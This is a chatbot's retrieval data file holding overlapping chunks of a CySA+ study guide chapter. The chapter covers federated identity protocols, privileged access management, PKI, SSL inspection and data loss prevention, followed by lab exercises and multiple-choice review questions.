rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	are required for federated identities to work. Hacking from Inside a Federation Federated identities can be very useful, but federations are only as strong as their weakest member’s security. In the past, one of the authors of this book was involved in the incident response process between members of a large-­scale federation. A successful hacker used compromised credentials to log into systems at various federation member sites. There, he used the credentials to access systems used for research efforts. Although the credentials he had were not administrative credentials, they did have local system access, allowing the attacker to identify and exploit local privilege escalation flaws. 58 Chapter 2 ■ System and Network Architecture Once he had exploited those flaws, he replaced the SSH Daemon running on the systems and captured credentials belonging to other federation members as well as local users. That provided him with enough new credentials to continue his exploits throughout other member sites. The hacker was eventually tracked back through a series of systems around the world and was arrested after a massive coordinated effort between system administrators, security professionals, and law enforcement. The federation continued to operate, but the hacker’s attacks led to additional security controls being put into place to ensure that future attacks of the same nature would be harder. If you are part of a federation, you should consider how much you trust the organizational security practices and policies of the other federation members. That should drive the rights and access that you provide to holders of federated identities, as well as how you monitor their actions. If you’d like to read more about this, the U.S. Federal Bureau of Investigation wrote a case study about the event that is available here: http://publish.illinois.edu/ kericker/files/2013/09/NCDIR-­TR-­2008-­01.pdf. FIGURE 2.4 Federated identity high-­level design 2. Consumer is redirected to the IDP, and their identity is validated Identity Provider (IDP) 3. IDP provides token to consumer Consumer SP trusts IDP 4. SP accepts tokens and allows use of the service 1. Consumer requests access to service Service Provider (SP) Identity and Access Management 59 Federated Identity Design Choices Using federated identity creates new security design concerns that you will have to plan and design around. If you are intending to leverage federated identity, the first question to answer is what trust model you want to use with the federated identity provider. Common providers of federated identity include Google, LinkedIn, and Amazon, but a broad range of commercial and private federations exist, including those operated by governments and higher education. If you are using an existing federated identity provider such as Google, you are likely interested in allowing consumers to bring their own identity, which you will then map internally to your own privilege and rights structures. This model presumes that you do not care that a user is probably who they claim to be—­instead, you only care that they own the account they are using. In federation models that rely on verifiable identities, a greater level of assurance
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	LinkedIn, and Amazon, but a broad range of commercial and private federations exist, including those operated by governments and higher education. If you are using an existing federated identity provider such as Google, you are likely interested in allowing consumers to bring their own identity, which you will then map internally to your own privilege and rights structures. This model presumes that you do not care that a user is probably who they claim to be—­instead, you only care that they own the account they are using. In federation models that rely on verifiable identities, a greater level of assurance about the user’s identity claims is needed, requiring additional trust between the federated identity providers and the relying parties. Examples of this include research federations that have identity vetting and assertion requirements between multiple identity providers within the federation. Trust decisions will also influence organizational decisions about manual provisioning versus automatic provisioning and deprovisioning. Integration with third-­party federated identity services works best when provisioning occurs when users request access with immediate account provisioning occurring once the federated identity has been validated. Manual provisioning provides greater security by allowing for additional oversight but can cause delays for user access. Provisioning can also involve attribute release, as relying parties in a federation need some basic information for a user account to provide authorization and to contact the user. The amount of information released by an identity provider can vary, from complete attribute release with all data about the account potentially available to very limited release such as the request shown in Figure 2.5. Figure 2.5 shows an example of an attribute release request for LoginRadius.com, a site that supports both LinkedIn and Google with federated identities for their users. Implementation decisions for each of these technologies will vary, but design requirements for data handling, storage, and release of attributes are all important. Similar concerns exist for self-­service password resets and other user-­ initiated account options. Allowing users to change these settings typically results in a lower support load, but it may also allow attackers to use poor security questions or other methods to change user passwords and other data without the user being involved. 60 Chapter 2 FIGURE 2.5 ■ System and Network Architecture Attribute release request for LoginRadius.com Once you have identified the appropriate trust requirements for the identities you intend to use for your federated identities, you will either have to adopt the underlying technologies that they use or select the technology that fits your needs. This is particularly true if you are federating your own organization, rather than using a federated identity provider like LinkedIn or Google. Technologies like Security Assertion Markup Language (SAML), OAuth, OpenID Connect, and Facebook Connect are all potentially part of the solutions you may adopt. The type of federation you intend to implement also influences the security requirements you can expect, or may require, from federation members, including both identity providers and relying parties. In a loosely bound federation like sites using Google accounts,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to adopt the underlying technologies that they use or select the technology that fits your needs. This is particularly true if you are federating your own organization, rather than using a federated identity provider like LinkedIn or Google. Technologies like Security Assertion Markup Language (SAML), OAuth, OpenID Connect, and Facebook Connect are all potentially part of the solutions you may adopt. The type of federation you intend to implement also influences the security requirements you can expect, or may require, from federation members, including both identity providers and relying parties. In a loosely bound federation like sites using Google accounts, the underlying security model for Google accounts is not as significant of a concern since any owner of a Google account can typically use services that federate with Google. In federations that require a higher trust level, vetting of the security practices of both identity providers and relying parties is necessary. Identity providers must validate the identity of the users they support, they must secure their credential store, and they should have Identity and Access Management 61 a strong handling and notification process in place for security issues that might impact the federation’s members. Relying parties need to ensure that their credential handling is properly secured and that they are meeting any security or operational requirements that the federation presents. Federated Identity Technologies Four major technologies serve as the core of federated identity for current federations: SAML, AD FS, OAuth, and OpenID Connect. These technologies provide ways for identity providers to integrate with service providers in a secure manner without having to know details about how the service provider implements their service or their own use of the identity. Table 2.3 compares SAML, OpenID, OAuth2, and AD FS, including their support for authorization and authentication, some of their most common potential security risks, and how they are often used. TA B L E 2 . 3 Comparison of federated identity technologies SAML OpenID OAuth2 AD FS Authorization Yes No Yes Yes Authentication Yes Yes Partial Yes Potential Message confidentiality Redirect manipulation Redirect manipulation Token attacks (replay, capture) Protocol usage and processing risks Message confidentiality Message confidentiality Denial of service Replay attacks CSRF/XSS attacks Authorization or resource server impersonation security risks Phishing Common uses Enterprise authentication and authorization, particularly in Linux-­centric environments Authentication API and service authorization Enterprise authentication and authorization, particularly in Windows-­centric environments 62 Chapter 2 ■ System and Network Architecture SAML SAML is an XML-­based language used to send authentication and authorization data between identity providers and service providers. It is frequently used to enable single sign-­on for web applications and services because SAML allows identity providers to make assertions about principals to service providers so that they can make decisions about that user. SAML allows authentication, attribute, and authorization decision statements to be exchanged. Figure 2.6 shows a very simple sample SAML authentication process. In this flow, a user attempts to use an SAML authenticated service and is referred to the identity provider to authenticate their identity.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Network Architecture SAML SAML is an XML-­based language used to send authentication and authorization data between identity providers and service providers. It is frequently used to enable single sign-­on for web applications and services because SAML allows identity providers to make assertions about principals to service providers so that they can make decisions about that user. SAML allows authentication, attribute, and authorization decision statements to be exchanged. Figure 2.6 shows a very simple sample SAML authentication process. In this flow, a user attempts to use an SAML authenticated service and is referred to the identity provider to authenticate their identity. After a successful login, the browser returns to the relying party with an appropriate SAML response, which it verifies. With these steps done, the user can now use the application they initially wanted to access. FIGURE 2.6 Simple SAML transaction Relying Party User (Browser) SAML Identity Provider 1. Login request 2. Redirected to SSO provider 5. SAML response sent to relying party 3. SAML request parsed and user authenticated 4. SAML response returned to browser 6. User is logged in OWASP provides a comprehensive SAML security cheat sheet at http:// cheatsheetseries.owasp.org/cheatsheets/SAML_Security_ Cheat_Sheet.html. AD FS Active Directory Federation Services (AD FS) is the Microsoft answer to federation. ADFS provides authentication and identity information as claims to third-­party partner sites. Partner sites then use trust policies to match claims to claims supported by a service, and then it uses those claims to make authorization decisions. Identity and Access Management 63 ADFS uses a similar process to an OAuth authentication process: 1. The user attempts to access an ADFS-­enabled web application hosted by a resource partner. 2. The ADFS web agent on the partner’s web server checks for the ADFS cookie; if it is there, access is granted. If the cookie is not there, the user is sent to the partner’s ADFS server. 3. The resource partner’s ADFS checks for an SAML token from the account partner, and if it’s not found, ADFS performs home realm discovery. 4. Home realm discovery identifies the federation server associated with the user and then authenticates the user via that home realm. 5. The account partner then provides a security token with identity information in the form of claims, and sends the user back to the resource partner’s ADFS server. 6. Validation then occurs normally and uses its trust policy to map the account partner claims to claims the web application supports. 7. A new SAML token is created by ADFS that contains the resource partner claims, and this cookie is stored on the user’s computer. The user is then redirected to the web application, where the application can read the cookie and allow access supported by the claims. ADFS can be controlled using the ADFS MMC snap-­in, adfs.msc. The ADFS console allows you to add resource partners and account partners, map partner claims, manage account stores, and configure web applications that support federation. Microsoft provides a useful overview of ADFS at http://msdn.microsoft.com/en-­us/library/ bb897402.aspx. OAuth The OAuth
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	claims the web application supports. 7. A new SAML token is created by ADFS that contains the resource partner claims, and this cookie is stored on the user’s computer. The user is then redirected to the web application, where the application can read the cookie and allow access supported by the claims. ADFS can be controlled using the ADFS MMC snap-­in, adfs.msc. The ADFS console allows you to add resource partners and account partners, map partner claims, manage account stores, and configure web applications that support federation. Microsoft provides a useful overview of ADFS at http://msdn.microsoft.com/en-­us/library/ bb897402.aspx. OAuth The OAuth 2.0 protocol provides an authorization framework designed to allow third-­party applications to access HTTP-­based services. It was developed via the Internet Engineering Task Force (IETF) and supports web clients, desktops, mobile devices, and a broad range of other embedded and mobile technologies, as well as the service providers that they connect to. OAuth provides access delegation, allowing service providers to perform actions for you. OAuth flows recognize four parties: Clients The applications that users want to use Resource Owners The end users Resource Servers Servers provided by a service that the resource owner wants the application to use Authorization Servers Servers owned by the identity provider 64 Chapter 2 ■ System and Network Architecture Figure 2.7 shows how authentication flows work with OAuth. In this chain, the client is attempting to access a third-­party service. The third-­party site, which is the consumer, is directed to a service provider to authenticate. To request authentication, the consumer sends a request for a request token. The service provider validates the user’s identity, grants a request token, and then directs the consumer back to the service provider. There, the service provider obtains the user authorization and sends the user to the third-­party site. The consumer requests an access token, the service provider grants it, and then the consumer can access resources. FIGURE 2.7 OAuth authentication process Client OAuth Service Provider Seeks to use OAuth enabled resource Request authorization 3rd Party Service Provider Redirect to OAuth SP Grant OAuth verifier User authenticates to service provider Request access token Grant Access Token + Token Secret Redirect to 3rd party Use OAuth token until it expires Access to resource granted OpenID Connect OpenID Connect is often paired with OAuth to provide authentication. It allows the authorization server to issue an ID token in addition to the authorization token provided by OAuth. This allows services to know that the action was authorized and that the user authenticated with the identity provider. Privileged Access Management (PAM) Privileged access management (PAM) describes the set of technologies and practices that are used to manage and secure privileged accounts, access, and permissions for systems, users, and applications through an organization. PAM relies on the principle of least privilege—­the least amount of rights required to accomplish a task or role is what should be granted. Encryption and Sensitive Data Protection 65 Privileged accounts aren’t just root, admin, or similar accounts, although those are
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	token provided by OAuth. This allows services to know that the action was authorized and that the user authenticated with the identity provider. Privileged Access Management (PAM) Privileged access management (PAM) describes the set of technologies and practices that are used to manage and secure privileged accounts, access, and permissions for systems, users, and applications through an organization. PAM relies on the principle of least privilege—­the least amount of rights required to accomplish a task or role is what should be granted. Encryption and Sensitive Data Protection 65 Privileged accounts aren’t just root, admin, or similar accounts, although those are common examples of superuser accounts, and thus are often the first privileged accounts that come to mind. Additional examples can include service accounts, application accounts, local and domain administrator accounts, helpdesk accounts used to address password changes or other similar privileged tasks, and emergency access accounts sometimes called “break glass” accounts. User accounts may also be given specific privileged access in some circumstances, requiring privileged access management for those accounts. PAM helps to address a number of common issues, including over-­provisioning of privileges, life cycle management and prevention of privilege creep associated with privileges being retained as users change jobs and roles, the use of embedded or hard-­coded credentials, and similar problems. While many of the IAM concepts covered in the CySA+ exam objectives focus on authentication, PAM is focused on rights and life cycle management, providing a broader view of how credentials and privileges are used over time. Want to read more about PAM? BeyondTrust has a detailed writeup at www.beyondtrust.com/resources/glossary/ privileged-­access-­management-­pam. Cloud Access Security Broker (CASB) Another cloud security tool is a cloud access security broker (CASB). CASB tools are policy enforcement points that can exist either locally or in the cloud, and they enforce security policies when cloud resources and services are used. CASBs can help with data security, antimalware functionality, service usage and access visibility, and risk management. As you might expect with powerful tools, a CASB can be very helpful but requires careful configuration and continued maintenance. Encryption and Sensitive Data Protection Both encryption and hashing are critical to many of the controls found at each of the layers we have discussed. They play roles in network security, host security, and data security, and they are embedded in many of the applications and systems that each layer depends on. This makes using current, secure encryption techniques and ensuring that proper key management occurs critical to a layered security design. When reviewing security designs, it is important to identify where encryption (and hashing) are used, how they are used, and how both the encryption keys and their passphrases are stored. It is also important to understand when data is encrypted and when it is unencrypted—­security designs can fail because 66 Chapter 2 ■ System and Network Architecture the carefully encrypted data that was sent securely is unencrypted and stored in a cache or by a local user, removing the protection it relied on during transit. Public
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	techniques and ensuring that proper key management occurs critical to a layered security design. When reviewing security designs, it is important to identify where encryption (and hashing) are used, how they are used, and how both the encryption keys and their passphrases are stored. It is also important to understand when data is encrypted and when it is unencrypted—­security designs can fail because 66 Chapter 2 ■ System and Network Architecture the carefully encrypted data that was sent securely is unencrypted and stored in a cache or by a local user, removing the protection it relied on during transit. Public Key Infrastructure (PKI) Public key infrastructure (PKI) is used to issue cryptographic certificates that are used for encryption, user and service authentication, code signing, and other purposes. PKI relies on asymmetric encryption to provide confidentiality, integrity, and to authenticate that a user or entity is who they claim to be. If you’re not familiar with asymmetric and symmetric encryption, you’ll find a quick explanation at www.youtube.com/watch?v=pbPJIgdR3-­8. The basic PKI certificate request and issuance flow is shown in Figure 2.8. FIGURE 2.8 PKI certificate request process 4. CA signs and issues certificate to requestor 1. Requests certificate from CA Sends: PKI User Certificate Signing Request (CSR) 2. Validates requestor’s identity Certificate Authority 3. Approves request to issue certificate Registration Authority The five major components are as follows: ■■ ■■ A certificate authority (CA), which creates, stores, and signs certificates A registration authority (RA), which verifies that entities requesting certificates are who they claim to be ■■ A directory that stores keys ■■ A certificate management system that supports access to and delivery of certificates ■■ A certificate policy that states the practices and procedures the PKI uses and which is used to validate the PKI’s trustworthiness Encryption and Sensitive Data Protection 67 Another key concept for PKI use is certificate revocation. Certificates include a variety of information, including the location of a CRL or certificate revocation list. CRLs allow certificate authorities to invalidate certificates before their expiration dates if they are compromised or canceled. This helps ensure that certificates that can no longer be trusted can be revoked. You’re most likely to run into PKI through certificate authorities who provide TLS certificates used to secure websites and other services, but that’s not their only use. Many organizations run their own PKI as part of their infrastructure so that they can create and manage their own internal certificates. Secure Sockets Layer (SSL) Inspection As you learned in Chapter 7, “Analyzing Vulnerability Scans,” the Secure Sockets Layer (SSL) protocol and its successor, Transport Layer Security (TLS), are used to encrypt many types of network traffic. While you’re most likely to see them used to secure connections to web servers, TLS is used in many different places. Of course, encrypting traffic means that you can’t observe, monitor, and analyze it. That’s where SSL inspection devices and technologies come into play. SSL inspection requires the insertion of either a monitoring device for offline analysis or
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and manage their own internal certificates. Secure Sockets Layer (SSL) Inspection As you learned in Chapter 7, “Analyzing Vulnerability Scans,” the Secure Sockets Layer (SSL) protocol and its successor, Transport Layer Security (TLS), are used to encrypt many types of network traffic. While you’re most likely to see them used to secure connections to web servers, TLS is used in many different places. Of course, encrypting traffic means that you can’t observe, monitor, and analyze it. That’s where SSL inspection devices and technologies come into play. SSL inspection requires the insertion of either a monitoring device for offline analysis or by intercepting HTTPS or other TLS connections, terminating them at the inspection device or system, then passing the connection along to the original destination. This allows the intermediary system to inspect traffic while keeping the traffic encrypted on both sides of the connection. Since TLS relies on certificates for trust, using a device like this requires that systems in an organization trust that certificate; the connection will otherwise show an error or security issue. Despite being called SSL inspection, in modern use you’re technically inspecting TLS. Even though SSL has been replaced by TLS, the term SSL is still commonly used to describe the technology. In either case, old versions of SSL and TLS aren’t considered secure, so it’s important to ensure organizations are using modern, secure versions. Once properly set up, SSL inspection allows for traffic that would otherwise be unable to be inspected to be passed through security systems like intrusion prevention system (IPS) or data loss prevention (DLP) solutions. They can also help identify malicious command-andcontrol traffic that would otherwise appear to be normal encrypted web traffic. Since SSL inspection typically requires additional effort and setup prior to use, it isn’t always practical for a given situation where administrators may not control the device or where bandwidth or other limitations may create issues. Since it exposes traffic that would otherwise be encrypted, it also presents an opportunity for attackers or malicious insiders 68 Chapter 2 ■ System and Network Architecture to view and potentially modify traffic if they were able to gain access to the SSL inspection system or service. Data Loss Prevention (DLP) Data loss prevention (DLP) systems and software work to protect data from leaving the organization or systems where it should be contained. A complete DLP system targets data in motion, data at rest and in use, and endpoint systems where data may be accessed or stored. DLP relies on identifying the data that should be protected and then detecting when leaks occur, which can be challenging when encryption is frequently used between systems and across networks. This means that DLP installations combine endpoint software and various means of making network traffic visible to the DLP system. Personally Identifiable Information (PII) Personally identifiable information (PII) is any information that could reasonably permit an individual to be identified, either by direct or by indirect methods. Common examples of PII include financial and medical records, addresses
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and in use, and endpoint systems where data may be accessed or stored. DLP relies on identifying the data that should be protected and then detecting when leaks occur, which can be challenging when encryption is frequently used between systems and across networks. This means that DLP installations combine endpoint software and various means of making network traffic visible to the DLP system. Personally Identifiable Information (PII) Personally identifiable information (PII) is any information that could reasonably permit an individual to be identified, either by direct or by indirect methods. Common examples of PII include financial and medical records, addresses and phone numbers, and national or state identification numbers like Social Security numbers, passport numbers, and driver’s license numbers in the United States. Cardholder Data (CHD) Card holder data (CHD) is credit card information, including the primary account number (PAN), the cardholder’s name, and the expiration date. Additional information known as sensitive authentication data includes the CVV or card verification code, the data contained in the magnetic stripe and chip, and a PIN code if one is used. CHD is often called PCI data after the Payment Card Industry’s PCI DSS standard. Another common type of protected data that isn’t included in the exam objectives is protected health information (PHI), which is a subset of PII. You may run into other acronyms, but PII, PHI, and PCI/CHD data are the most commonly used. Summary Understanding system and network architecture concepts and designs is an important skill for security professionals. The ability to leverage design concepts and to identify where security issues may arise can help organizations be more secure. Modern infrastructure often involves elements of virtualization, which allows virtual computers to run on physical hardware. Containerization is increasingly common, with many organizations making concerted efforts to move applications and services to containers Summary 69 because they are lightweight and portable, making them a good fit for cloud environments. At the same time, an increasing number of services and applications are being built to leverage serverless computing, where they exist as functions rather than running applications or systems. Operating system security remains a priority for organizations. Hardening systems limits their attack surface and is part of normal systems management practices for mature organizations. Hardening for Windows systems leverages a variety of techniques, including protecting the Windows Registry. Analysts also need to know common file locations for configuration files, what system processes are, and how hardware architecture influences what systems can run and how malicious software may impact them. Logging allows security analysts and administrators to review what occurred on a system or with a service. Log analysis relies on the ability to correlate logs, making time synchronization critical for review. Logs that are not properly time synchronized can lead to mistakes or misconceptions about what occurred and when. At the same time, logging levels may need to be set properly to balance the amount of information gathered against the detail that is desired. Security practitioners need to consider on-­premises, cloud, and
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	are, and how hardware architecture influences what systems can run and how malicious software may impact them. Logging allows security analysts and administrators to review what occurred on a system or with a service. Log analysis relies on the ability to correlate logs, making time synchronization critical for review. Logs that are not properly time synchronized can lead to mistakes or misconceptions about what occurred and when. At the same time, logging levels may need to be set properly to balance the amount of information gathered against the detail that is desired. Security practitioners need to consider on-­premises, cloud, and hybrid networks. Network segmentation through tools and technologies like VLANs, firewalls, and even physical segmentation can help to control risk. Software-­defined networking allows networks to be controlled through code, making them flexible and manageable without making physical changes. Zero trust and SASE are both important design concepts in modern networks. Zero trust focuses on requiring security at every point in a network rather than simply focusing on a strong perimeter. Secure access service edge designs use software-­defined wide area networks and security functionality from various security tools to help create security at endpoints as SaaS becomes the dominant means of providing services to organizations. Identity and access management is another major topic practitioners need to consider. Multifactor authentication, which helps reduce the risk of stolen or exposed passwords, is a commonly implemented solution, but passwordless authentication, which relies on security tokens and applications, is becoming more common. Single sign-­on remains a common solution for organizations that want to use their credentials across many systems without creating more overhead for users. Federation allows organizations to rely on credentials from a known and trusted provider to access their services, reducing overhead and making them easier to adopt and use. Finally, privileged access management (PAM) helps manage and protect superuser and other privileged accounts and access, whereas cloud access security brokers (CASBs) control what users can do in the cloud. Encryption, particularly public key infrastructure for certificate-­based authentication and encryption, and SSL inspection, allowing encrypted traffic to be reviewed, are both important elements for security practitioners to be aware of. Sensitive data protection remains important for organizations, and the CySA+ exam outline focuses on data loss prevention (DLP) systems and techniques and two types of data: personally identifiable information (PII) and cardholder data (CHD) as part of system and network architecture. 70 Chapter 2 ■ System and Network Architecture Exam Essentials Explain infrastructure concepts and designs. Describe serverless, virtualization, and containerization concepts, where and why they are most often used and how they differ from each other. Understand operating system concepts. Explain system hardening and understand the role of system hardening in organizational security practices. Describe the Windows Registry, and why it is important as part of operating system security. Know common file structure information and configuration file locations for common operating systems like Windows and Linux. Describe system processes. Understand the role of hardware architecture in system security. Understand critical operational elements
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	2 ■ System and Network Architecture Exam Essentials Explain infrastructure concepts and designs. Describe serverless, virtualization, and containerization concepts, where and why they are most often used and how they differ from each other. Understand operating system concepts. Explain system hardening and understand the role of system hardening in organizational security practices. Describe the Windows Registry, and why it is important as part of operating system security. Know common file structure information and configuration file locations for common operating systems like Windows and Linux. Describe system processes. Understand the role of hardware architecture in system security. Understand critical operational elements of logging. Explain why time synchronization is critical to log analysis and how synchronization is accomplished. Describe log levels and why choosing an appropriate logging level is important. Explain network architecture concepts and technologies. Describe the similarities and differences between on-­premises, cloud, and hybrid networks as well as the security concerns for each model. Understand network segmentation and explain why it is useful and how it can be accomplished. Describe software-­defined networking, zero trust, and secure access service edge technologies and designs. Understand identity and access management. Explain multifactor authentication, including authentication factors. Describe passwordless authentication. Understand single sign-­on and its role in organizations. Explain federation and how federated identity works. Know the role and uses for privileged access management (PAM) and cloud access security brokers as part of identity infrastructure. Describe how encryption is used to protect sensitive data. Explain public key infrastructure and its common components. Understand SSL inspection, its uses and drawbacks. Explain how data loss prevention (DLP) is used and what is required for effective implementation. Describe sensitive data and know the differences between personal identifiable information and cardholder data. Lab Exercises Activity 2.1: Set Up Virtual Machines for Exercises In this exercise you will set up a virtual machine for use in later labs. If you already have VMware Workstation, VMware Player, or VirtualBox, you can skip the first part of this exercise. Lab Exercises 71 If you are using VirtualBox you will need to slightly adapt the instructions in Part 3 to VirtualBox’s process. Part 1: Download VMware Player 1. Visit www.vmware.com/products/workstation-­player.html. 2. Download VMware Workstation Player. 3. Install VMware Player. Part 2: Download virtual machines Now that you have a virtualization tool, you’re ready to download useful virtual machines. This can take some time depending on your bandwidth. 1. Visit www.kali.org/get-­kali and select Virtual Machines, then select the 64-­bit VMware option. You’ll need an unzip utility like 7-­Zip to extract the compressed file. 2. Visit https://information.rapid7.com/download-­metasploitable-­2017 .html and download the Metasploitable virtual machine. Part 3: Set up virtual machines 1. Navigate to your downloaded Kali Linux file. Unzip the file to a location where you’ll store your VMware images if you haven’t already. 2. Open VMware Player and select Open A Virtual Machine. Navigate to your Kali Linux virtual machine directory and select the VMX file, then click Open. 3. You can now hit the green play button for the VM to run
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Virtual Machines, then select the 64-­bit VMware option. You’ll need an unzip utility like 7-­Zip to extract the compressed file. 2. Visit https://information.rapid7.com/download-­metasploitable-­2017 .html and download the Metasploitable virtual machine. Part 3: Set up virtual machines 1. Navigate to your downloaded Kali Linux file. Unzip the file to a location where you’ll store your VMware images if you haven’t already. 2. Open VMware Player and select Open A Virtual Machine. Navigate to your Kali Linux virtual machine directory and select the VMX file, then click Open. 3. You can now hit the green play button for the VM to run it. 4. Repeat this process with the Metasploitable virtual machine. You now have virtual machines you can practice with throughout this book. Activity 2.2: Explore the Windows Registry In this exercise, you will explore the Windows Registry. 1. On a Windows system where you have administrator access, run regedit from the search bar. You can also search for and run regedit. You will have to answer “yes” to the prompt asking if you want regedit to make changes to your machine. 2. Explore the main Registry hives. Expand each to see the keys and values they contain. Do not make any changes. 3. Find the maximum password age in the Registry. Navigate to HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Windows NT\CurrentVersion\SeCEdit\Reg Values\ MACHINE/System/CurrentControlSet/Services/Netlogon/Parameters/. Record what you see. 72 Chapter 2 ■ System and Network Architecture 4. Search for secpol.msc from the Start menu, then right-­click it and select Run As Administrator. 5. Navigate to Security Settings ➢ Local Policies ➢ Security Options ➢ Domain Member: Maximum Machine Account Password Age and note the value. 6. (Advanced) Close regedit. Change the value of the maximum password age in secpol .msc and review what changed using regedit. Activity 2.3: Review System Hardening Guidelines In this exercise, you will explore the Windows 11 stand-­alone CIS benchmark. This exercise will help you understand what makes up a benchmark and how you might change or adapt it to your organization’s needs. 1. Visit www.cisecurity.org/cis-­benchmarks and select Access All Benchmarks. 2. You’ll have to provide contact information to receive an email providing access to the benchmarks. 3. Once you receive the email, visit the download site and download the Windows 11 stand-­alone benchmark (or another benchmark if you’d like, but this exercise is written with the Windows 11 benchmark in mind—­you’re welcome to adapt the exercise if you’d like). 4. Open the benchmark PDF and scroll through the index—­this is a very large document, so don’t try to read it all. 5. Navigate to page 398—­note that the page in the PDF and the page number are not the same, and you want the page numbered 398. This page describes account lockout settings. Review the description, the impact, and the instructions. Note that it includes references and other details about the setting. Would this setting make sense for your environment? Why or why not? What concerns might you express if you were asked to turn it on for every system in
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the benchmark PDF and scroll through the index—­this is a very large document, so don’t try to read it all. 5. Navigate to page 398—­note that the page in the PDF and the page number are not the same, and you want the page numbered 398. This page describes account lockout settings. Review the description, the impact, and the instructions. Note that it includes references and other details about the setting. Would this setting make sense for your environment? Why or why not? What concerns might you express if you were asked to turn it on for every system in a large organization? 6. Repeat this process for the settings found on page 537. Answer the same questions about the ability to automatically connect to open hotspots, networks shared by contacts, and hotspots offering paid services. You’ve now done some basic review of a configuration benchmark. Scroll through the rest of the index to identify one or two more settings that may be of interest to you as practice, then you’re done! Review Questions 73 Review Questions 1. 2. 3. 4. 5. 6. Naomi wants to make her applications portable and easy to move to new environments without the overhead of a full operating system. What type of solution should she select? A. An x86 architecture B. Virtualization C. Containerization D. A SASE solution Bharath wants to make changes to the Windows Registry. What tool should he select? A. regwiz.msc B. notepad.exe C. secpol.msc D. regedit Tom wants to set an appropriate logging level for his Cisco networking equipment while he’s troubleshooting. What log level should he set? A. 1 B. 3 C. 5 D. 7 Which of the following is not a common use of network segmentation? A. Decreasing attack surfaces B. Limiting the scope of regulatory compliance C. Reducing availability D. Increasing the efficiency of a network Ric’s organization wants to implement zero trust. What concern should Ric raise about zero trust implementations? A. They can be complex to implement. B. Zero trust does not support TLS inspection. C. Zero trust is not compatible with modern software-­defined networks. D. They are likely to prevent users from accomplishing their jobs. Michelle has a security token that her company issues to her. What type of authentication factor does she have? A. Biometric B. Possession C. Knowledge D. Inherence Chapter 2 74 7. 8. 9. ■ System and Network Architecture Which party in a federated identity service model makes assertions about identities to service providers? A. RPs B. CDUs C. IDPs D. APs What design concept requires that each action requested be verified and validated before it is allowed to occur? A. Secure access service edge B. Zero trust C. Trust but verify D. Extended validation network Juan’s organization uses LDAP to allow users to log into a variety of services without having to type in their username and password again. What type of service is in use? A. SSO B. MFA C. EDR D. ZeroAuth 10. Jen’s organization wants to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	party in a federated identity service model makes assertions about identities to service providers? A. RPs B. CDUs C. IDPs D. APs What design concept requires that each action requested be verified and validated before it is allowed to occur? A. Secure access service edge B. Zero trust C. Trust but verify D. Extended validation network Juan’s organization uses LDAP to allow users to log into a variety of services without having to type in their username and password again. What type of service is in use? A. SSO B. MFA C. EDR D. ZeroAuth 10. Jen’s organization wants to ensure that administrator credentials are not used improperly. What type of solution should Jen recommend to address this requirement? A. SAML B. CASB C. PAM D. PKI 11. Financial and medical records are an example of what type of data? A. CHD B. PCI C. PII D. TS/SCI 12. Which of the following is not part of cardholder data for credit cards? A. The cardholder’s name B. The CVV code C. The expiration date D. The primary account number Review Questions 75 13. Sally wants to find configuration files for a Windows system. Which of the following is not a common configuration file location? A. The Windows Registry B. C:\Program Files\ C. directory:\Windows\Temp D. C:\ProgramData\ 14. What type of factor is a PIN? A. A location factor B. A biometric factor C. A possession factor D. A knowledge factor 15. What protocol is used to ensure that logs are time synchronized? A. TTP B. NTP C. SAML D. FTP 16. OAuth, OpenID, SAML, and AD FS are all examples of what type of technology? A. Federation B. Multifactor authentication C. Identity vetting D. PKI 17. Example Corporation has split their network into network zones that include sales, HR, research and development, and guest networks, each separated from the others using network security devices. What concept is Example Corporation using for their network security? A. Segmentation B. Software-­defined networking C. Single-­point-­of-­failure avoidance D. Zoned routing 18. During a penetration test of Anna’s company, the penetration testers were able to compromise the company’s web servers and deleted their log files, preventing analysis of their attacks. What compensating control is best suited to prevent this issue in the future? A. Using full-­disk encryption B. Using log rotation C. Sending logs to a syslog server D. Using TLS to protect traffic Chapter 2 76 ■ System and Network Architecture 19. Ben is preparing a system hardening procedure for his organization. Which of the following is not a typical system hardening process or step? A. Updating and patching systems B. Enabling additional services C. Enabling logging D. Configuration disk encryption 20. Gabby is designing a multifactor authentication system for her company. She has decided to use a passphrase, a time-­based code generator, and a PIN to provide additional security. How many distinct factors will she have implemented when she is done? A. One B. Two C. Three D. Four Chapter 3 Malicious Activity THE COMPTIA
